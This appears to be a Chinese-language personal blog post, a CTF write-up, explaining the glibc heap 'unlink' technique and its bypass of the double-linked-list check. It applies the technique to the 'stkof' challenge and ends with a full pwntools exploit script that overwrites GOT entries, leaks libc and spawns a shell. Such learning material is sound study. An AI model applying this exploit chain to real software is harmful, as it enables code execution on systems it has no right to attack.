@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Unlink(stkof) | Bin Fantasy🤯</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="​        关于unlink的介绍和入门。。。。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unlink(stkof)">
+<meta property="og:url" content="http://example.com/2020/03/02/Unlink-stkof/index.html">
+<meta property="og:site_name" content="Bin Fantasy🤯">
+<meta property="og:description" content="​        关于unlink的介绍和入门。。。。">
+<meta property="og:locale">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/5.png">
+<meta property="article:published_time" content="2020-03-02T12:57:20.000Z">
+<meta property="article:modified_time" content="2020-03-03T03:39:35.052Z">
+<meta property="article:author" content="Ash3n On3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Bin Fantasy🤯" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-Unlink-stkof" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/03/02/Unlink-stkof/" class="article-date">
+  <time class="post-time" datetime="2020-03-02T12:57:20.000Z" itemprop="datePublished">
+    <span class="post-month">3月</span><br/>
+    <span class="post-day">02</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Unlink(stkof)
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>​        关于unlink的介绍和入门。。。。<span id="more"></span></p>
+<p>​        unlink也是一个看了好久看不懂的东西，今天算是整明白了。</p>
+<h2 id="0x00-unlink-漏洞"><a href="#0x00-unlink-漏洞" class="headerlink" title="0x00 . unlink 漏洞"></a>0x00 . unlink 漏洞</h2><h3 id="A-unlink原理"><a href="#A-unlink原理" class="headerlink" title="A . unlink原理"></a>A . unlink原理</h3><p>​        假设有如下chunk0，chunk1，其中chunk0是使用中的small，chunk1是已释放的small chunk，两者在内存上相邻。</p>
+<p>​        由于chunk1已释放，所以位于small bin链表中，又与chunk2，chunk3在链表结构上相邻。</p>
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/1.png" style="zoom:50%;" />
+
+<p>​        此时如果free(chunk0)，glibc机制就会判断前后(内存上)有无相邻的已释放chunk，如果有，就和chunk0一同合并成一个大chunk。而与此同时，还要把chunk1从small bin中“拔出来”，其中发生的断链，修改链表的操作就是unlink。换言之unlink就是一个从双向链表中抽出一个chunk的操作。（photo from ctf-wiki）</p>
+<p>​        <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/2.png" style="zoom:67%;" /></p>
+<p>​        所以unlink只适用于非fast chunk，因为fast chunk不存在双向链表，同时fast chunk也并不是用完就马上回收的。</p>
+<h3 id="B-历史的漏洞利用（32-bit）"><a href="#B-历史的漏洞利用（32-bit）" class="headerlink" title="B . 历史的漏洞利用（32 bit）"></a>B . 历史的漏洞利用（32 bit）</h3><p>​        那么如何通过unlink达到任意写的目的呢？曾经的unlink利用是这样的：</p>
+<p>​        <img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/3.png" style="zoom:55%;" /></p>
+<p>​        1.在进行unlink之前修改chunk0的fd和bk，使得FD = target_addr，BK = expect value（可以通过堆溢出或其他漏洞修改，或者构造fake chunk）。</p>
+<p>​        2.进行合并操作，需要将chunk1的前驱后继的指向修改一下，改成chunk0的前驱后继，也就是将chunk1的FD和BK改成chunk0的FD和BK，在一起总要一条心嘛。</p>
+<p>​        3.此时chunk1已经FD写入了target_addr，BK写入了expect value，在释放chunk0，使得chunk1进行unlink。</p>
+<p>​        4.chunk1的unlink，实际上就是修改small bin中的前驱后继，将前驱的后继（原本是chunk1）改成自己的后继，将后继的前驱（原本是chunk1）改成自己的前驱。而系统是怎么修改前驱后继的呢，就是修改FD指针 + 8的地址（heap head 占8个字节，紧接着就是该chunk的fd指针）和修改FD指针 + 12的地址（heap head占8 Bytes，fd占4 Bytes，紧接着就是该chunk的bk指针）。</p>
+<p>​        5.所以系统会将chunk1的FD–&gt;bk改成自己的BK，将BK–&gt;fd改成自己的FD，换句话说就是。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk=BK;	<span class="comment">//target_addr - 12 + 12 = expect value;</span></span><br><span class="line">BK-&gt;fd=FD;	<span class="comment">//expect value + 8 = target_addr;</span></span><br></pre></td></tr></table></figure>
+
+<p>​        这样就实现了任意写。</p>
+<h3 id="C-如今的漏洞利用-（64-bit）"><a href="#C-如今的漏洞利用-（64-bit）" class="headerlink" title="C . 如今的漏洞利用 （64 bit）"></a>C . 如今的漏洞利用 （64 bit）</h3><p>​        但是现在的glibc加强了保护机制，增加了以下检查过程。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  <span class="built_in">malloc_printerr</span> (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure>
+
+<p>​        也就是说，必须使得chunk1前驱的后继，和后继的前驱都指向同一个p。至于p是啥，正常情况下当然是chunk1咯，但是既然要漏洞利用，那当然不能顺着系统机制来。</p>
+<p>​        我们进行如下构造：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1-&gt;FD = p - <span class="number">0x18</span>;</span><br><span class="line">chunk1-&gt;BK = p - <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure>
+
+<p>​        那么系统检查时就会进行如下判断：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1-&gt;FD-&gt;bk == chunk1-&gt;BK-&gt;fd ;	<span class="comment">//bingo!! </span></span><br><span class="line">p - <span class="number">0x18</span> + <span class="number">0x18</span> == p - <span class="number">0x10</span> +<span class="number">0x10</span>; 	<span class="comment">// We pass!!</span></span><br></pre></td></tr></table></figure>
+
+<p>​        既然检查过了，就进行unlink吧。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk1-&gt;FD-&gt;bk = chunk1-&gt;BK;		<span class="comment">//p - 0x18 + 0x18 = p - 0x10</span></span><br><span class="line">chunk1-&gt;BK-&gt;fd = chunk1-&gt;FD;		<span class="comment">//p - 0x10 + 0x10 = p - 0x18</span></span><br></pre></td></tr></table></figure>
+
+<p>​        也就是说，我们把p指针向前偏移了0x18。虽然不算是任意写，但也足够利用了。</p>
+<h2 id="0x01-stkof-writeup"><a href="#0x01-stkof-writeup" class="headerlink" title="0x01 . stkof writeup"></a>0x01 . stkof writeup</h2><h3 id="A-程序分析"><a href="#A-程序分析" class="headerlink" title="A . 程序分析"></a>A . 程序分析</h3><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/4.png" style="zoom:40%;" />
+
+<p>​        useless()的功能大概是用来测试用户输出的chunk序号是否已分配，仅此而已。在主函数里没有找到可以输出的函数，所以可以考虑覆写got表来leak libc。</p>
+<p><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Unlink-stkof/5.png"></p>
+<p>​        至于其他函数：</p>
+<ul>
+<li><p>add()没什么特别的。</p>
+</li>
+<li><p>delete()中free()后未将指针置空</p>
+</li>
+<li><p>fill()中再让用户输入一遍size，不同于add()中的size，因此可以堆溢出。    </p>
+</li>
+</ul>
+<p>​        在本程序的几个重要函数中可以可以发现，chunk的堆指针被存放在了一个数组s[ ]中，而双击数组s可以发现，其地址是0x0602140，它是一个位于bss段的指针数组，换言之是一个可写的全局变量。s是我们覆写got表的关键。</p>
+<p>​        有全局变量存在，可以利用unlink漏洞覆写got表了。</p>
+<h3 id="B-内存布局"><a href="#B-内存布局" class="headerlink" title="B .内存布局"></a>B .内存布局</h3><ul>
+<li>申请4个chunk，其中chunk2是small chunk。（本程序没有申请限制，可以申请多一点，只要方便布局。）</li>
+<li>用chunk1的堆溢出覆盖chunk2，改写其FD和BK成s[0]-0x10(即chunk2指针)，改写chunk3的头信息。</li>
+<li>在上一步完成的同时要通过检查，使系统在释放chunk3时相信chunk2也已经释放了，从而向前合并。</li>
+<li>这一合并不要紧，系统一不小心就把chunk2处的存放的指针向低地址偏移了0x18，够我们地肆无忌惮发挥了。</li>
+</ul>
+<h3 id="C-Leak-amp-Getshell"><a href="#C-Leak-amp-Getshell" class="headerlink" title="C . Leak &amp; Getshell"></a>C . Leak &amp; Getshell</h3><ul>
+<li>再改写chunk2的内容，实际上就是覆写s数组，改写chunk指针。此时可写入got表地址了。</li>
+<li>覆写情况：s[0]=free@got,s[1]=puts@got,s[2]=atol@got。</li>
+<li>再利用fill函数将free@got改成puts@got，free[1]就得到了puts@plt。</li>
+<li>通过计算，得到libc地址和system地址，通过elf文件搜索可以找到“/bin/sh”。</li>
+<li>利用fil将atol@got改写成system地址。</li>
+<li>最后直接发送”/bin/sh”都会调用system函数，getshell。</li>
+</ul>
+<h3 id="D-Exp"><a href="#D-Exp" class="headerlink" title="D . Exp"></a>D . Exp</h3><p>​    贴一下脚本呗，虽然不是自己写的。（exp from ctf-wiki）有空再自己写一遍。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.binary = <span class="string">&quot;./stkof&quot;</span></span><br><span class="line">stkof = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">7777</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">head = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment"># trigger to malloc buffer for io function</span></span><br><span class="line">    alloc(<span class="number">0x100</span>)  <span class="comment"># idx 1</span></span><br><span class="line">    <span class="comment"># begin</span></span><br><span class="line">    alloc(<span class="number">0x30</span>)  <span class="comment"># idx 2</span></span><br><span class="line">    <span class="comment"># small chunk size in order to trigger unlink</span></span><br><span class="line">    alloc(<span class="number">0x80</span>)  <span class="comment"># idx 3</span></span><br><span class="line">    <span class="comment"># a fake chunk at global[2]=head+16 who&#x27;s size is 0x20</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)  <span class="comment">#prev_size</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment">#size</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x18</span>)  <span class="comment">#fd</span></span><br><span class="line">    payload += p64(head + <span class="number">16</span> - <span class="number">0x10</span>)  <span class="comment">#bk</span></span><br><span class="line">    payload += p64(<span class="number">0x20</span>)  <span class="comment"># next chunk&#x27;s prev_size bypass the check</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite global[3]&#x27;s chunk&#x27;s prev_size</span></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is at global[2]</span></span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make it believe that prev chunk is free</span></span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(stkof.got[<span class="string">&#x27;free&#x27;</span>]) + p64(stkof.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(</span><br><span class="line">        stkof.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit free@got to puts@plt</span></span><br><span class="line">    payload = p64(stkof.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># free global[1] to leak puts addr</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">    log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># modify atoi@got to system addr</span></span><br><span class="line">    payload = p64(system_addr)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">    p.send(p64(binsh_addr))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/03/02/Unlink-stkof/" data-id="ckmlis0z50009s0lj7t6n3d39" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/03/03/SleepHolder/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          SleepHolder
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/03/01/Malloc-Hook/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Malloc_Hook小记</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Bin Fantasy🤯</h1>
+    <h2 class="blog-subtitle">You may found nothing here.</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友链</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2020 - 2021 Ash3n On3<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
